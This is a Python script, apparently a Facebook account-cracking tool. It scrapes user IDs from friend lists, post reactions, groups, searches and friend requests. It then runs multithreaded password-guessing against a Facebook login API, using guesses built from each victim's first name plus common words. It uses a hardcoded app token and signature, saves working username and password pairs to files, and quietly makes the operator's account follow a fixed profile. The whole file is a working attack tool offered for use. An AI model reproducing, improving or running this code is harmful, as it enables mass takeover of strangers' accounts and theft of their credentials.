#Update 14/10/2020 (18:36)
#Recode Mulu asu tinggal pake apa susahnya:v
import os,sys,time,requests,json,re
from bs4 import BeautifulSoup as parser
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore, Back
B = Fore.BLUE
W = Fore.WHITE
C = Fore.CYAN
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
id=[]
count=0
result=0
chek=0
die=0
check=[]
vuln=[]
mbasic="https://mbasic.facebook.com{}"
def clear():
    os.system('clear')
def baner():    
    print(f'''
{B}╔═╗{W}┌─┐┌─┐┌─┐┌┐ ┌─┐┌─┐┬┌─   {B}╔╦╗{W}┌┐ ┌─┐
{B}╠╣ {W}├─┤│  ├┤ ├┴┐│ ││ │├┴┐{R}───{B}║║║{W}├┴┐├┤ 
{B}╚  {W}┴ ┴└─┘└─┘└─┘└─┘└─┘┴ ┴   {B}╩ ╩{W}└─┘└  ''')
    print('' + Back.BLUE + Fore.BLACK + '        Creator : FahmiApz         \033[00m')
    print()

def masuk():
    try:
          cek = open("cookies").read()
    except FileNotFoundError:
          cek = input("\033[00mCookies : \033[1;96m")
    cek = {"cookie":cek}
    ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
    if "mbasic_logout_button" in str(ismi):
        if "Apa yang Anda pikirkan sekarang" in str(ismi):
            with open("cookies","w") as f:
                 f.write(cek["cookie"])
        else:
            try:
                 requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
            except:
                 pass
        try:
             ikuti = parser(requests.get(mbasic.format("/kang.ngeue.313"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
             ses.get(mbasic.format(ikuti),cookies=cek)
        except:
             pass
        return cek["cookie"]
    else:
        print('\033[00mCookies \033[91mInvalid\033[00m')
        time.sleep(1)
        os.system('python fb.py')
def nid():
    r=ses.get(mbasic.format('/me'),cookies=kukis).text
    name=re.findall(r'<title>(.*?)</title>',r)[0]
    uid=re.findall(r'name="target" value="(.*?)"',r)[0]
    print("\033[00mName \033[91m: \033[93m"+name)
    print("\033[00mID   \033[91m: \033[93m"+uid)
    print('\033[91m<\033[90m---------------------\033[91m>\033[00m')
def temanid(url):
    req=requests.get(url,cookies=kukis).content
    getuser = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>',str(req))
    for x in getuser:
        if 'profile' in x[0]:
            id.append(x[1] + '|' + re.findall("=(\d*)?",str(x[0]))[0])
        elif 'friends' in x:
            continue
        else:
            id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
        print(f'\r\033[00mTotal ID: \033[93m{str(len(id))}',end='')
    if 'Lihat Teman Lain' in str(req):
        temanid(mbasic.format(parser(req,'html.parser').find('a',string='Lihat Teman Lain')['href']))
    return id
def targetteman(url):
    req=requests.get(url,cookies=kukis).content
    getuser = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>',str(req))
    for x in getuser:
        if 'profile' in x[0]:
            id.append(x[1] + '|' + re.findall("=(\d*)?",str(x[0]))[0])
        elif 'friends' in x:
            continue
        else:
            id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
        print(f'\r\033[00mTotal ID: \033[93m{str(len(id))}',end='')
    if 'Lihat Teman Lain' in str(req):
        targetteman(mbasic.format(parser(req,'html.parser').find('a',string='Lihat Teman Lain')['href']))
    return id
def like(url):
    try:
        req=requests.get(url,cookies=kukis).content
        lk=re.findall(r'href="(/ufi.*?)"',str(req))[0]
        aws=getlike(mbasic.format(lk))
        return aws
    except:
        print('\033[91mFailed To Crack\033[00m')
        sleep(1)
        menu()
def getlike(react):
    like=requests.get(react,cookies=kukis).content
    lkusr= re.findall('class="b."><a href="(.*?)">(.*?)</a></h3>',str(like))
    for user in lkusr:
        if 'profile' in user[0]:
            id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
        else:
            id.append(user[1] + "|" + user[0].split('/')[1])
        print(f'\r\033[00mTotal ID: \033[93m{str(len(id))}',end='')
    if 'Lihat Selengkapnya' in str(like):
        getlike(mbasic.format(parser(like,'html.parser').find('a',string="Lihat Selengkapnya")["href"]))
    return id 
def grupid(url):
    req=requests.get(url,cookies=kukis).content
    users=re.findall(r'a class=".." href="/(.*?)">(.*?)</a>',str(req))
    for user in users:
        if "profile" in user[0]:
            id.append(user[1] + "|" + re.findall('id=(\d*)',str(user[0]))[0])
        else:
            id.append(user[1] + "|" + user[0])
        print(f'\r\033[00mTotal ID: \033[93m{str(len(id))}',end='')
    if "Lihat Selengkapnya" in str(req):
        grupid(mbasic.format(parser(req,"html.parser").find("a",string="Lihat Selengkapnya")["href"]))
    return id
def search(url):
    req=requests.get(url,cookies=kukis).content
    users=re.findall(r'class="s cc"><a href="(.*?)"><div class=".."><div class="..">(.*?)</div></div>',str(req))
    for user in users:
        if "profile" in user[0]:
            id.append(user[1] + "|" + re.findall("id=(\d*)",str(user[0]))[0])
        else:
            id.append(user[1] + "|" + user[0].split("?")[0])
        print(f'\r\033[00mTotal ID: \033[93m{str(len(id))}',end='')
    if "Lihat Hasil Selanjutnya" in str(req):
        search(parser(req,'html.parser').find("a",string="Lihat Hasil Selanjutnya")["href"])
    return id
def kmn(url):
    req=requests.get(url,cookies=kukis).content
    users=re.findall(r'middle"><a class=".." href="(.*?)">(.*?)</a>',str(req))
    for user in users:
        if "mbasic" in user[0]:
            id.append(user[1] + '|' + re.findall("uid=(\d*)",str(user[0]))[0])
        else:
            id.append(user[1] + '|' + re.findall("=(\d*)",str(user[0]))[0])
        print(f"\r\033[00mTotal ID: \033[93m{str(len(id))}",end="")
    if "Lihat selengkapnya" in str(req):
        kmn(mbasic.format(parser(req,"html.parser").find("a",string="Lihat selengkapnya")["href"]))
    return id
def login(username,password,cek=False):
          global die,result,chek,count
          b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
          params = {
                     'access_token': b,
                     'format': 'JSON',
                     'sdk_version': '2',
                     'email': username,
                     'locale': 'en_US',
                     'password': password,
                     'sdk': 'ios',
                     'generate_session_cookies': '1',
                     'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
          }
          api = 'https://b-api.facebook.com/method/auth.login'
          response = requests.get(api, params=params)
          if 'EAA' in response.text:
              print(f"\r\033[00m[\033[1;32m✓\033[00m] \033[1;32m{username}\033[90m|\033[1;32m{password}                        ",end="")
              print()
              result += 1
              if cek:
                      vuln.append(username+"|"+password)
              else:
                      with open('vuln.txt','a') as f:
                           f.write(username + '|' + password + '\n')
          elif 'www.facebook.com' in response.json()['error_msg']:
                print(f"\r\033[00m[\033[1;91mx\033[00m] \033[1;33m{username}\033[90m|\033[1;33m{password}                      ",end="")
                print()
                chek += 1
                if cek:
                      check.append(username+"|"+password)
                else:
                      with open('check.txt','a') as f:
                           f.write(username + '|' + password + '\n')
          else:
                die += 1
          tk=['\033[1;97m#','\033[1;96m#','\033[1;97m#','\033[1;91m#']
          for o in tk:
                     print(f"\r\033[00m[{o}\033[00m] Life : \033[1;92m{str(result)} \033[00mCheck : \033[1;93m{str(chek)} \033[00mDie : \033[1;91m{str(die)}\033[00m",end="")
                     time.sleep(0.2)
def menu():
    clear()
    baner()
    nid()
    print('''
\033[93m1). \033[00mCrack From Friends
\033[93m2). \033[00mCrack From Target Friends
\033[93m3). \033[00mCrack From React Post
\033[93m4). \033[00mCrack From Group
\033[93m5). \033[00mCrack From Search
\033[93m6). \033[00mCrack From Requests Friends
\033[93m0). \033[00mExit''')
    pilih_menu()
def pilih_menu():
    ff=input('\033[00m>> \033[93m')
    if ff == '1':
       clear()
       baner()
       nid()
       usr=parser(ses.get(mbasic.format('/me'),cookies=kukis).content,'html.parser').find('a',string='Teman')
       username=temanid(mbasic.format(usr['href']))
       with ThreadPoolExecutor(max_workers=30) as ex:
            for user in username:
                aa=user.split('|')
                bb=aa[0].split(' ')
                for x in bb:
                    litpas=[
                         str(x) + '123',
                         str(x) + '1234',
                         str(x) + '12345',
                         str(x) + '123456'
                         ]
                    litpas.append('Sayang')
                    litpas.append('Bangsat')
                    litpas.append('Kontol')
                    litpas.append('Anjing')
                    for passw in set(litpas):
                        ex.submit(login,(aa[1]),(passw))
       print('\n\033[00m[\033[96m*\033[00m]Done.')
    elif ff == '2':
       clear()
       baner()
       nid()
       asw=input('\033[00mTarget User: \033[93m')
       if asw.isdigit():
          asw='/profile.php?id='+asw
       else:
          asw='/'+asw
       try:
           usr=parser(ses.get(mbasic.format(asw),cookies=kukis).content,'html.parser').find('a',string='Teman')
           username=targetteman(mbasic.format(usr["href"]))
       except TypeError:
           print('\033[91mUser Not Found\033[00m')
           sleep(1)
           menu()
       with ThreadPoolExecutor(max_workers=30) as ex:
            for user in username:
                aa=user.split('|')
                bb=aa[0].split(' ')
                for x in bb:
                    litpas=[
                         str(x) + '123',
                         str(x) + '1234',
                         str(x) + '12345',
                         str(x) + '123456'
                         ]
                    litpas.append('Sayang')
                    litpas.append('Bangsat')
                    litpas.append('Kontol')
                    litpas.append('Anjing')
                    for passw in set(litpas):
                        ex.submit(login,(aa[1]),(passw))
       print('\n\033[00m[\033[96m*\033[00m]Done.')
    elif ff == '3':
         clear()
         baner()
         nid()
         asw=input('\033[00mPost?Url: \033[93m')
         if 'www.facebook' in asw:
             asw=asw.replace('www.facebook','mbasic.facebook')
         elif 'm.facebook.com' in asw:
             asw=asw.replace('m.facebook.com','mbasic.facebook.com')
         elif asw == '':
             print('\033[91mDont Be Empty!\033[00m')
             sleep(1)
             menu()
         username=like(asw)
         with ThreadPoolExecutor(max_workers=30) as ex:
              for user in username:
                  aa=user.split('|')
                  bb=aa[0].split(' ')
                  for x in bb:
                      litpas=[
                           str(x) + '123',
                           str(x) + '1234',
                           str(x) + '12345',
                           str(x) + '123456'
                           ]
                      litpas.append('Sayang')
                      litpas.append('Bangsat')
                      litpas.append('Kontol')
                      litpas.append('Anjing')
                      litpas.append('786786')
                      for passw in set(litpas):
                          ex.submit(login,(aa[1]),(passw))
         print('\n\033[00m[\033[96m*\033[00m]Done.')
    elif ff == '4':
         clear()
         baner()
         nid()
         asw=input('\033[00mID Groups: \033[93m')
         username=grupid(mbasic.format('/browse/group/members/?id='+asw))
         with ThreadPoolExecutor(max_workers=30) as ex:
              for user in username:
                  aa=user.split('|')
                  bb=aa[0].split(' ')
                  for x in bb:
                      litpas=[
                           str(x) + '123',
                           str(x) + '1234',
                           str(x) + '12345',
                           str(x) + '123456'
                           ]
                      litpas.append('Sayang')
                      litpas.append('Bangsat')
                      litpas.append('Kontol')
                      litpas.append('Anjing')
                      litpas.append('786786')
                      for passw in set(litpas):
                          ex.submit(login,(aa[1]),(passw))
         print('\n\033[00m[\033[96m*\033[00m]Done.')
    elif ff == '5':
         clear()
         baner()
         nid()
         asw=input('\033[00mQuery: \033[93m')
         username=search(mbasic.format('/search/people/?q='+asw))
         with ThreadPoolExecutor(max_workers=30) as ex:
              for user in username:
                  aa=user.split('|')
                  bb=aa[0].split(' ')
                  for x in bb:
                      litpas=[
                           str(x) + '123',
                           str(x) + '1234',
                           str(x) + '12345',
                           str(x) + '123456'
                           ]
                      litpas.append('Sayang')
                      litpas.append('Bangsat')
                      litpas.append('Kontol')
                      litpas.append('Anjing')
                      litpas.append('786786')
                      for passw in set(litpas):
                          ex.submit(login,(aa[1]),(passw))
         print('\n\033[00m[\033[96m*\033[00m]Done.')
    elif ff == '6':
         clear()
         baner()
         nid()
         username=kmn(mbasic.format('/friends/center/requests/#friends_center_main'))
         with ThreadPoolExecutor(max_workers=30) as ex:
              for user in username:
                  aa=user.split('|')
                  bb=aa[0].split(' ')
                  for x in bb:
                      litpas=[
                           str(x) + '123',
                           str(x) + '1234',
                           str(x) + '12345',
                           str(x) + '123456'
                           ]
                      litpas.append('Sayang')
                      litpas.append('Bangsat')
                      litpas.append('Kontol')
                      litpas.append('Anjing')
                      for passw in set(litpas):
                          ex.submit(login,(aa[1]),(passw))
         print('\n\033[00m[\033[96m*\033[00m]Done.')
    elif ff == '0':
         sys.exit('\033[1;97mThanks For Using My Tools\n\033[91mexit\033[00m')
    else:
         print('\033[91mWrong Input!\033[00m')
         sleep(1)
         menu()
if __name__=="__main__":
     clear()
     baner()
     ses=requests.Session()
     kuki=masuk()
     kukis={'cookie':kuki}
     menu()
     
